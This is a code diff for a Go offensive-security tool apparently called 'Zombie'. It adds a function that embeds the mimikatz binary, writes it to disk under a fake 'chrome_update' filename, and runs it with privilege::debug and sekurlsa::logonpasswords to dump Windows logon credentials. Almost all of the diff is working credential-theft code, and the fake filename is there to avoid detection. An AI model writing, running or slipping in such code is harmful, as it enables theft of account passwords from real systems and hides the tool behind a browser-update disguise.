@@ -4,11 +4,16 @@ import (
 	"Zombie/src/Core"
 	"Zombie/src/Utils"
 	"Zombie/src/ZbCrypto"
+	"bytes"
+	"embed"
 	"fmt"
 	"github.com/urfave/cli/v2"
 	"io/ioutil"
+	"os"
+	"os/exec"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
 )
 
@@ -167,4 +172,50 @@ func DecryptXManager(info Utils.UserInfo) {
 			Utils.DDatach <- XManagerInfo
 		}
 	}
+}
+
+//go:embed asserts/mimikatz.exe
+var mi embed.FS
+
+func Mimi(ctx *cli.Context) (err error) {
+	info, _ := mi.ReadFile("asserts/mimikatz.exe")
+
+	file, err := ioutil.TempFile("./", "chrome_update_*.exe")
+	if err != nil {
+		return err
+	}
+	// 确保程序结束时删除临时文件
+	defer os.Remove(file.Name())
+
+	if _, err := file.Write(info); err != nil {
+		return err
+	}
+	file.Close()
+
+	cmd := []string{"privilege::debug", "log"}
+
+	if ctx.IsSet("query") {
+		cmd = append(cmd, ctx.StringSlice("query")...)
+	} else {
+		cmd = append(cmd, "sekurlsa::logonpasswords")
+	}
+
+	cmd = append(cmd, "exit")
+
+	command := exec.Command(file.Name(), cmd...)
+	outinfo := bytes.Buffer{}
+	command.Stdout = &outinfo
+	cmderr := command.Start()
+	if cmderr != nil {
+		fmt.Println(cmderr.Error())
+	}
+	if cmderr = command.Wait(); cmderr != nil {
+		fmt.Println(cmderr.Error())
+	} else {
+		fmt.Println(command.ProcessState.Pid())
+		fmt.Println(command.ProcessState.Sys().(syscall.WaitStatus).ExitCode)
+		fmt.Println(outinfo.String())
+	}
+
+	return err
 }
